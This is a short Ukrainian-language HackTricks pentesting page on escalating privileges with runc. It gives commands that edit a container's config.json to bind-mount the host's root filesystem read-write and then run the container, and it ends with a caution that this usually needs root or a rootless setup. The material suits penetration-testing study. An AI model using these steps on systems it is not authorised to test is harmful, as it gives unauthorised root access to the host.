# Ескалація привілеїв RunC

{{#include ../../banners/hacktricks-training.md}}

## Основна інформація

Якщо ви хочете дізнатися більше про **runc**, перегляньте наведену нижче сторінку:


{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Якщо ви виявите, що `runc` встановлено на хості, можливо, ви зможете **запустити контейнер, змонтувавши кореневу папку / хоста**.
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Це не завжди працюватиме, оскільки типовою операцією runc є запуск від імені root, тому запуск від імені непривілейованого користувача просто не може працювати (якщо у вас немає конфігурації rootless). Встановлювати конфігурацію rootless як типову зазвичай не варто, оскільки всередині rootless containers є чимало обмежень, які не застосовуються за межами rootless containers.

{{#include ../../banners/hacktricks-training.md}}
